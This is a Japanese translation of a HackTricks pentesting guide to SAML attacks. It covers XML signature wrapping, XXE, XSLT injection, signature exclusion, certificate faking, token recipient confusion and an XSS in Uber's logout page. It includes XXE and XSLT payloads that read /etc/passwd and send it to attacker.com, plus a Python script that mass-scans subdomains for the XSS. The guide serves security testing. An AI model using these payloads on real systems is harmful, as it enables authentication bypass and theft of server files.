# SAML攻撃

## SAML攻撃

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* サイバーセキュリティ会社で働いていますか？ HackTricksであなたの会社を宣伝したいですか？または、PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロードしたりしたいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricks swag**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

## 基本情報

{% content-ref url="saml-basics.md" %}
[saml-basics.md](saml-basics.md)
{% endcontent-ref %}

## 攻撃グラフィック

![](<../../.gitbook/assets/image (535) (1) (1) (2) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (13).png>)

## ツール

[**SAMLExtractor**](https://github.com/fadyosman/SAMLExtractor): URLまたはURLのリストを受け取り、SAMLの消費URLを表示するツール。

## XMLラウンドトリップ

XMLでは、XMLの署名部分がメモリに保存され、いくつかのエンコーディング/デコーディングが行われ、署名がチェックされます。理想的には、そのエンコーディング/デコーディングはデータを変更しないはずですが、このシナリオでは、**チェックされるデータと元のデータが同じであるとは限りません**。

例えば、次のコードを確認してください：
```ruby
require 'rexml/document'

doc = REXML::Document.new <<XML
<!DOCTYPE x [ <!NOTATION x SYSTEM 'x">]><!--'> ]>
<X>
<Y/><![CDATA[--><X><Z/><!--]]>-->
</X>
XML

puts "First child in original doc: " + doc.root.elements[1].name
doc = REXML::Document.new doc.to_s
puts "First child after round-trip: " + doc.root.elements[1].name
```
プログラムをREXML 3.2.4またはそれ以前のバージョンに対して実行すると、次の出力が表示されます:
```
First child in original doc: Y
First child after round-trip: Z
```
これが、上記のプログラムからREXMLが元のXMLドキュメントを見た方法です：

![](<../../.gitbook/assets/image (561).png>)

そして、パースとシリアル化のラウンド後にREXMLがそれを見た方法です：

![](<../../.gitbook/assets/image (562).png>)

脆弱性とその悪用方法の詳細については、以下のリンクを参照してください：

* [https://mattermost.com/blog/securing-xml-implementations-across-the-web/](https://mattermost.com/blog/securing-xml-implementations-across-the-web/)
* [https://joonas.fi/2021/08/saml-is-insecure-by-design/](https://joonas.fi/2021/08/saml-is-insecure-by-design/)

## XML Signature Wrapping Attacks

XMLドキュメントには、XML Signatureが含まれており、通常は**2つの独立したステップ**で処理されます：**シグネチャの検証**と**機能の呼び出し**（ビジネスロジック）。もし、両方のモジュールがデータに対して異なる見解を持っている場合、XML Signature Wrapping攻撃（XSW）と呼ばれる新しい脆弱性のクラスが存在します。\
これらの攻撃では、**攻撃者はXML Signatureを無効にしない****偽造要素を注入**することで、**メッセージの構造を変更**します。この変更の目的は、**アプリケーションロジックとシグネチャ検証モジュールがメッセージの異なる部分を使用する**ようにメッセージを変更することです。その結果、受信者はXML Signatureを正常に検証しますが、アプリケーションロジックは偽の要素を処理します。**攻撃者はこのように完全性保護と起源認証を回避**し、任意のコンテンツを注入することができます。

SAMLリクエストから：

![](<../../.gitbook/assets/image (537).png>)

### XSW #1

攻撃者は、**シグネチャが見つかる新しいルート要素を追加**することができます。したがって、検証ツールがシグネチャの整合性をチェックする際に、**Response -> Assertion -> Subject**の整合性をチェックしたことに気付き、赤い部分の**悪意のある新しいResponse -> Assertion -> Subject**のパスとデータを使用する可能性があります。

![](<../../.gitbook/assets/image (538).png>)

### XSW #2

#1との違いは、使用されるシグネチャのタイプです。XSW #1ではenveloping signatureが使用されましたが、#2ではdetached signatureが使用されます。\
整合性チェックが行われた後、新しい悪意のある構造が以前と同じであることに注意してください。これは、整合性チェック後にビジネスロジックを混乱させるためのものです。

![](<../../.gitbook/assets/image (539).png>)

### XSW #3

この攻撃では、**元のAssertionと同じレベルに悪意のあるAssertionが作成**され、ビジネスロジックを混乱させ、悪意のあるデータを使用します。

![](<../../.gitbook/assets/image (540).png>)

### XSW #4

XSW #4は、#3と似ていますが、この場合、**元のAssertionがコピーされたAssertionの子になります**。

![](<../../.gitbook/assets/image (541).png>)

### XSW #5

XSW #5では、シグネチャと元のAssertionが標準の3つの構成（enveloped/enveloping/detached）のいずれにも含まれていません。この場合、コピーされたAssertionがシグネチャを包み込みます。

![](<../../.gitbook/assets/image (542).png>)

### XSW #6

XSW #6は、#4と#5と同じ場所にコピーされたAssertionを挿入します。ここで興味深いのは、コピーされたAssertionがシグネチャを包み込み、シグネチャが元のAssertionを包み込むという点です。

![](<../../.gitbook/assets/image (543).png>)

### XSW #7

XSW #7は、**Extensions**要素を挿入し、コピーされた**Assertion**を**子要素**として追加します。Extensionsは、より制限の少ないスキーマ定義を持つ有効なXML要素です。この[ホワイトペーパー](https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91.pdf)の著者は、OpenSAMLライブラリに対応するためにこのメソッドを開発しました。OpenSAMLは、シグネチャ検証中に使用されるIDを処理されたAssertionのIDと正しく比較するためにスキーマ検証を使用していました。著者は、同じIDを持つコピーされたAssertionsがより制限の少ないスキーマ定義を持つ要素の子である場合、特定の対策策を回避することができました。

![](<../../.gitbook/assets/image (544).png>)

### XSW #8

XSW #8は、XSW #7で使用される攻撃パターンのバリエーションを実行するために、**より制限の少ないXML要素**を使用します。今回は、元のAssertionがコピーされたAssertionの代わりに、より制限の少ない要素の子になります。

![](<../../.gitbook/assets/image (545).png>)

### ツール

Burp拡張機能[**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e)を使用して、リクエストを解析し、選択したXSW攻撃を適用し、実行することができます。

![](<../../.gitbook/assets/image (546).png>)

### オリジナルの論文

この攻撃についての詳細は、[https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91.pdf](https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91.pdf)のオリジナルの論文を参照してください。

## XXE

XXE攻撃がどのような種類の攻撃かわからない場合は、次のページを読んでください：

{% content-ref url="../xxe-xee-xml-external-entity.md" %}
[xxe-xee-xml-external-entity.md](../xxe-xee-xml-external-entity.md)
{% endcontent-ref %}

SAMLレスポンスは、デフレートされ、base64でエンコードされた**XMLドキュメント**であるため、SAMLレスポンスとして送信されるXMLドキュメントを操作することで**XXE**をテストすることができます。例：
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY    file SYSTEM "file:///etc/passwd">
<!ENTITY dtd SYSTEM "http://www.attacker.com/text.dtd" >]>
<samlp:Response ... ID="_df55c0bb940c687810b436395cf81760bb2e6a92f2" ...>
<saml:Issuer>...</saml:Issuer>
<ds:Signature ...>
<ds:SignedInfo>
<ds:CanonicalizationMethod .../>
<ds:SignatureMethod .../>
<ds:Reference URI="#_df55c0bb940c687810b436395cf81760bb2e6a92f2">...</ds:Reference>
</ds:SignedInfo>
<ds:SignatureValue>...</ds:SignatureValue>
[...]
```
### ツール

[**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e)というBurp拡張機能を使用することもできます。これを使用してSAMLリクエストからPOCを生成し、可能なXXE脆弱性をテストすることができます。

また、このトークもチェックしてください: [https://www.youtube.com/watch?v=WHn-6xHL7mI](https://www.youtube.com/watch?v=WHn-6xHL7mI)

## SAMLを介したXSLT

XSLTについての詳細は以下を参照してください：

{% content-ref url="../xslt-server-side-injection-extensible-stylesheet-languaje-transformations.md" %}
[xslt-server-side-injection-extensible-stylesheet-languaje-transformations.md](../xslt-server-side-injection-extensible-stylesheet-languaje-transformations.md)
{% endcontent-ref %}

拡張可能なスタイルシート言語変換（XSLT）は、XMLドキュメントをHTML、JSON、またはPDFなどの他のドキュメントタイプに変換するためのチューリング完全な言語です。ここで重要なポイントは、**攻撃には有効な署名が必要ではない**ということです。これは、**XSLT変換がデジタル署名の検証の前に行われるため**です。基本的に、攻撃を実行するためには署名付きのSAMLレスポンスが必要ですが、署名は自己署名または無効なものであっても構いません。

![xslt](https://epi052.gitlab.io/notes-to-self/img/saml/xslt.png)

ここで、この種の脆弱性をチェックするための**POC**を見つけることができます。このセクションの最初に言及されているhacktricksページには、ペイロードがあります。
```markup
<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
...
<ds:Transforms>
<ds:Transform>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="doc">
<xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
<xsl:variable name="escaped" select="encode-for-uri($file)"/>
<xsl:variable name="attackerUrl" select="'http://attacker.com/'"/>
<xsl:variable name="exploitUrl" select="concat($attackerUrl,$escaped)"/>
<xsl:value-of select="unparsed-text($exploitUrl)"/>
</xsl:template>
</xsl:stylesheet>
</ds:Transform>
</ds:Transforms>
...
</ds:Signature>
```
### ツール

[SAML Raider](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e)というBurp拡張機能を使用することもできます。これを使用して、SAMLリクエストからPOCを生成し、XSLTの脆弱性をテストすることができます。

また、次のトークも参考にしてください：[https://www.youtube.com/watch?v=WHn-6xHL7mI](https://www.youtube.com/watch?v=WHn-6xHL7mI)

## XML署名の除外 <a href="#xml-signature-exclusion" id="xml-signature-exclusion"></a>

署名の除外は、SAMLの実装が**署名要素が存在しない**場合の動作をテストするために使用されます。署名要素が**存在しない**場合、**署名検証ステップが完全にスキップされる可能性があります**。署名が検証されない場合、通常は署名されるはずの内容は攻撃者によって改ざんされる可能性があります。

![](<../../.gitbook/assets/image (547).png>)

### ツール <a href="#xml-signature-exclusion-how-to" id="xml-signature-exclusion-how-to"></a>

署名の除外は、SAMLレスポンスをインターセプトし、`Remove Signatures`をクリックすることから始まります。これにより、**すべての**署名要素が削除されます。

![sig-exclusion](https://epi052.gitlab.io/notes-to-self/img/saml/sig-exclusion.png)

署名が削除されたら、リクエストをターゲットに進めます。サービスが署名を必要としない場合

## 証明書の偽装 <a href="#certificate-faking" id="certificate-faking"></a>

証明書の偽装は、サービスプロバイダが信頼できるIDプロバイダによってSAMLメッセージが署名されたことを**検証するかどうか**をテストするプロセスです。SPとIdPの信頼関係は、SAMLメッセージを受け取るたびに確立され、**検証されるべきです**。これは、**自己署名**証明書を使用してSAMLレスポンスまたはアサーションに署名することになります。

### ツール <a href="#certificate-faking-how-to" id="certificate-faking-how-to"></a>

Burp拡張機能[**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e)を使用します。\
証明書を偽装するには、まずSAMLレスポンスをインターセプトします。\
レスポンスに署名が含まれている場合は、`Send Certificate to SAML Raider Certs`ボタンを使用します。

![send-cert](https://epi052.gitlab.io/notes-to-self/img/saml/send-cert.png)

証明書を送信した後、SAML Raider Certificatesタブにインポートされた証明書が表示されるはずです。そこで、インポートされた証明書を強調表示し、`Save and Self-Sign`ボタンを押します。

![sent-cert](https://epi052.gitlab.io/notes-to-self/img/saml/sent-cert.png)

これにより、元の証明書の自己署名クローンが生成されます。これで、Burpのプロキシに保持されているインターセプトされたリクエストに戻る時がきました。XML Signatureのドロップダウンメニューから新しい自己署名証明書を選択します。次に、既存の署名を削除するために`Remove Signatures`ボタンを使用します。最後に、与えられた状況によって**`(Re-)Sign Message`**または**`(Re-)Sign Assertion`**ボタン（どちらがより適切か）を使用します。

![remove-sig](https://epi052.gitlab.io/notes-to-self/img/saml/remove-sig.png)

自己署名証明書でメッセージに署名した後、送信します。認証に成功した場合、SAMLメッセージに署名できることがわかります。SAMLメッセージに署名できることは、アサーションの値を変更してもサービスプロバイダに受け入れられることを意味します。

## トークン受信者の混乱/サービスプロバイダのターゲットの混乱 <a href="#token-recipient-confusion" id="token-recipient-confusion"></a>

トークン受信者の混乱/サービスプロバイダのターゲットの混乱は、サービスプロバイダが**受信者を検証するかどうか**をテストします。つまり、**レスポンスが別のサービスプロバイダ向けに意図されている場合**、**現在の**サービスプロバイダはそれに気付き、**認証を拒否する**はずです。\
**受信者**フィールドは、SAMLレスポンスのSubject要素の子であるSubjectConfirmationData要素の属性です。

> SubjectConfirmationData要素は、主体を確認するための追加データを指定し、主体の確認の行為が行われる条件を制約します。主体の確認は、依存関係のあるパーティが、アサーションを提示するエンティティ（つまり、証明するエンティティ）とアサーションの主張の主体との関係を検証しようとするときに行われます。

SubjectConfirmationData要素で見つかる受信者属性は、**アサーションを配信する必要がある場所を指定するURL**です。受信者が受信者と異なるサービスプロバイダである場合、アサーションは受け入れられないはずです。

### 方法 <a href="#token-recipient-confusion-how-to" id="token-recipient-confusion-how-to"></a>

SAMLトークン受信者の混乱（SAML-TRC）を試みるためには、いくつかの前提条件が必要です。まず、**サービスプロバイダに正当なアカウントが必要**です。次に、**SP-TargetはSP-Legitが発行したトークンを受け入れる必要があります**。

条件が真である場合、攻撃は比較的簡単です。共有のIDプロバイダを介して**SP-Legitに認証**します。次に、IdPからSP-Legitに向かう途中の**SAMLレスポンスをインターセプト**します。インターセプトしたら、**SP-Legit向けに意図されたSAMLレスポンスをSP-Targetに送信**します。**SP-Targetがアサーションを受け入れる**場合、SP-Legitと同じアカウント名でログインし、SP-Targetの対応するリソースにアクセスできるようになります。

## ログアウト機能のXSS

（[ここで元の研究にアクセスできます](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/)）

ディレクトリブルートフォースを実行した後、次のページを見つけました：
```
https://carbon-prototype.uberinternal.com:443/oidauth/logout
```
ログアウトページです。上記のリンクを開くと、以下のページにリダイレクトされました。
```
https://carbon-prototype.uberinternal.com/oidauth/prompt?base=https%3A%2F%2Fcarbon-prototype.uberinternal.com%3A443%2Foidauth&return_to=%2F%3Fopenid_c%3D1542156766.5%2FSnNQg%3D%3D&splash_disabled=1
```
ベースパラメータはURLを受け取るので、古典的な`javascript:alert(123);`に置き換えてXSSをトリガーすることはどうでしょう。

### 大量攻撃

[**SAMLExtractor**](https://github.com/fadyosman/SAMLExtractor)を使用して、URLのリストを受け取り、コールバック（SAML consume）URLを返してくれるツールを使用しました。私は`uberinternal.com`のすべてのサブドメインをツールに与え、同じライブラリを使用している他のドメインがあるかどうかを確認しました。

次に、脆弱なページ`oidauth/prompt`を呼び出し、XSSを試し、入力が反映される場合は脆弱性のあるメッセージが表示されるスクリプトを作成しました。
```python
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from colorama import init ,Fore, Back, Style
init()

with open("/home/fady/uberSAMLOIDAUTH") as urlList:
for url in urlList:
url2 = url.strip().split("oidauth")[0] + "oidauth/prompt?base=javascript%3Aalert(123)%3B%2F%2FFady&return_to=%2F%3Fopenid_c%3D1520758585.42StPDwQ%3D%3D&splash_disabled=1"
request = requests.get(url2, allow_redirects=True,verify=False)
doesit = Fore.RED + "no"
if ("Fady" in request.content):
doesit = Fore.GREEN + "yes"
print(Fore.WHITE + url2)
print(Fore.WHITE + "Len : " + str(len(request.content)) + "   Vulnerable : " + doesit)
```
## 参考文献

攻撃手法は[https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/)から入手されました。\
追加のリソースと解説は[https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/)で見つけることができます。

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンを入手したり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>
